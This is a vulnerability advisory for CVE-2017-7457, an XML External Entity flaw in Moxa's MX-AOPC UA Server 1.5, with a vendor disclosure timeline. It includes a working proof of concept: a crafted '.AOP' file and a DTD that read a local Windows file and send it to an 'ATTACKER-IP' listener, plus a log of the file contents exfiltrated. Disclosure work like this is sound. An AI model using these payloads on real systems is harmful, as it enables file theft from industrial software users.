@@ -1,0 +1,105 @@
+[+] Credits: John Page AKA HYP3RLINX	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MOXA-MX-AOPC-SERVER-v1.5-XML-EXTERNAL-ENTITY.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+============
+www.moxa.com
+
+
+
+Product:
+=======================
+MX-AOPC UA SERVER - 1.5
+
+Moxa's MX-AOPC UA Suite is the first OPC UA server for industrial automation supporting both push and pull communication.
+
+
+
+Vulnerability Type:
+==============================
+XML External Entity Injection
+
+
+
+CVE Reference:
+==============
+CVE-2017-7457
+
+
+
+Security Issue:
+================
+XML External Entity via ".AOP" files used by MX-AOPC Server result in remote file disclosure. If local user opens
+a specially crafted malicious MX-AOPC Server file type.
+
+
+
+Exploit/POC:
+=============
+run MX-AOPC UA Server / Runtime / Start Server Runtime Service 
+
+a) ATTACKER SERVER LISTENER we will access Windows msfmap.ini as proof of concept
+python -m SimpleHTTPServer 8080
+
+"Evil.AOP" file
+
+<?xml version="1.0"?>  
+<!DOCTYPE roottag [ 
+<!ENTITY % file SYSTEM "c:\Windows\msdfmap.ini">
+<!ENTITY % dtd SYSTEM "http://ATTACKER-IP:8080/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+
+b) Evil "payload.dtd" file host on ATTACKER SERVER
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER-IP:8080?%file;'>">
+%all;
+
+
+e.g.
+
+python -m SimpleHTTPServer 8080
+
+Serving HTTP on 0.0.0.0 port 8080 ...
+
+VICTIM-IP - - [02/Mar/2017 10:06:00] "GET /payload.dtd HTTP/1.1" 200 -
+VICTIM-IP - - [02/Mar/2017 10:06:00] "GET /?;[connect%20name]%20will%20modify%20the%20connection%20if%20ADC.connect="name";[connect%20default]%20will%20modify%20the%20connection%20if%20name%20is%20not%20found;[sql%20name]%20will%20modify%20the%20Sql%20if%20ADC.sql="name(args)";[sql%20default]%20will%20modify%20the%20Sql%20if%20name%20is%20not%20found;Override%20strings:%20Connect,%20UserId,%20Password,%20Sql.;Only%20the%20Sql%20strings%20support%20parameters%20using%20"?";The%20override%20strings%20must%20not%20equal%20""%20or%20they%20are%20ignored;A%20Sql%20entry%20must%20exist%20in%20each%20sql%20section%20or%20the%20section%20is%20ignored;An%20Access%20entry%20must%20exist%20in%20each%20connect%20section%20or%20the%20section%20is%20ignored;Access=NoAccess;Access=ReadOnly;Access=ReadWrite;[userlist%20name]%20allows%20specific%20users%20to%20have%20special%20access;The%20Access%20is%20computed%20as%20follows:;%20%20(1)%20First%20take%20the%20access%20of%20the%20connect%20section.;%20%20(2)%20If%20a%20user%20entry%20is%20found,%20it%20will%20override.[connect%20default];If%20we%20want%20to%20disable%20unknown%20connect%20values,%20we%20set%20Access%20to%20NoAccessAccess=NoAccess[sql%20default];If%20we%20want%20to%20disable%20unknown%20sql%20values,%20we%20set%20Sql%20to%20an%20invalid%20query.Sql="%20"[connect%20CustomerDatabase]Access=ReadWriteConnect="DSN=AdvWorks"[sql%20CustomerById]Sql="SELECT%20*%20FROM%20Customers%20WHERE%20CustomerID%20=%20?"[connect%20AuthorDatabase]Access=ReadOnlyConnect="DSN=MyLibraryInfo;UID=MyUserID;PWD=MyPassword"[userlist%20AuthorDatabase]Administrator=ReadWrite[sql%20AuthorById]Sql="SELECT%20*%20FROM%20Authors%20WHERE%20au_id%20=%20?" HTTP/1.1" 200 -
+
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+High
+
+
+
+Disclosure Timeline:
+==========================================================
+Vendor Notification:  March 5, 2017
+Vendor confirms vulnerability : March 21, 2017
+Vendor "updated firmware April 7, 2017" : March 29, 2017
+April 9, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
